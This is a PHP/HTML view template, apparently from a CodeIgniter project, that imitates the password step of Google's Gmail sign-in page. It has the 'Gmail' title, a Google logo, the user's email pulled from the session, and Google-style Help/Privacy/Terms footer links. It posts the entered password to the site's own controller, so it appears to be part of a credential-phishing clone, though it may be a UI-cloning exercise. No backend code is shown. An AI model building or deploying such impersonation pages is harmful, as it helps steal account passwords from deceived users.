<html>

<head>
    <title>Gmail</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="password.css">
    <link rel="stylesheet" type="text/css" href="<?= base_url('bootstrap/css/bootstrap.min.css') ?>">
    <script href="<?= base_url('bootstrap/js/bootstrap.min.js') ?>"></script>

</head>

<body>
    <div class="container">
        <img src="<?= base_url('images/google.png') ?>">
        <form method="post" action="<?= site_url('login/password'); ?>">
            <div class="form-input">
                <h1><?php echo $_SESSION['email'] ?></h1>
                <input type="password" name="password" placeholder="Enter your password">
                <?= $this->session->flashdata('message'); ?>
                <?= form_error('password', '<small class="text-danger">', '</small>'); ?>
            </div>

            <a class="a2" href="#">Forgot password?</a>
            <input type="submit" name="next-login" value="next" class="btn-login">
        </form><br><br><br>
    </div>
    <table align="center">
        <tr>
            <td>Indonesia (Bandung)</td>
            <td> </td>
            <td> </td>
            <td> </td>
            <td> </td>
            <td> </td>
            <td> </td>
            <td> </td>
            <td> </td>
            <td> </td>
            <td> </td>
            <td> Help</td>
            <td> Privacy</td>
            <td> Terms</td>
        </tr>
    </table>
    <!--   <div style="text-align: center"></div> -->
    <style>
        body {
            margin: 0;
        }

        .container {
            /* width: : 250px; */
            height: 500px;
            padding: 20px 0px 20px 0px;
            text-align: center;
            background-color: white;
            border-radius: 8px;
            border-width: 230;
            /*border: 1px solid black;*/
            margin-top: 10%;
        }

        .container img {
            width: 120px;
            height: 63px;
            margin-top: 60px;
            margin-bottom: 45px;
        }

        input[type="password"] {
            height: 45px;
            width: 300px;
            font-family: tahoma;
            font-size: 15px;
            margin-bottom: 20px;
            background-color: white;
            padding-left: 20px;
        }

        .a2 {
            text-align: left;
            font-family: tahoma;
            text-decoration: none;
        }

        /*form-input:before{
	background: url(logo1.png);
}*/

        .btn-login {
            padding: 8px 25px;
            font-size: 17px;
            display: inline-block;
            color: white;
            background-color: #0066ff;
            border: none;
            border-radius: 4px;
        }

        a+input {
            margin-left: 100px;
        }

        td+td {
            font-family: tahoma;
            margin-left: 10px;
            font-size: 15px;
        }
    </style>
</body>

</html>